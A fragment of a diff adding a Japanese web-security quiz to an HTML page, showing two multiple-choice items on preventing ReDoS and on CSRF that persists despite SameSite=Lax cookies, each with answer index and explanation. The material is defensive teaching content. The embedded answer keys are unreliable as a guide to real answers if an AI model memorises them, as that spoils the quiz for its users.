+    "choices": ["正規表現の呼び出しを try/catch で囲む", "量指定子の入れ子をなくすよう書き換え、入力長に上限を設ける（必要なら線形時間のエンジンを使う）", "検証処理を async 関数にする", "g フラグを付けて最初の一致で止める"],
+    "answer": 1,
+    "explain": "ReDoS は例外ではなく、バックトラックで CPU を使い続けるのが原因。JS の正規表現は同期実行なので async でも止まる。パターンの修正・長さ制限・線形エンジンで防ぐ。",
+    "ref": "#redos"
+  },
+  {
+    "q": "セッション Cookie を SameSite=Lax にした。それでも CSRF の被害が残るのはどんな実装？",
+    "choices": ["状態を変える操作（削除など）を GET リクエストで受け付けている", "POST のフォームで CSRF トークンを使っている", "Cookie に HttpOnly を付けている", "API が Authorization ヘッダーのトークンで認証している"],
+    "answer": 0,
+    "explain": "Lax の Cookie は、別サイトからのトップレベルの GET 遷移（リンククリック）では送られる。GET で状態を変えるとリンク 1 つで操作させられる。",
+    "ref": "#csrf"
+  }
+]
+</script>
+</body>
+</html>
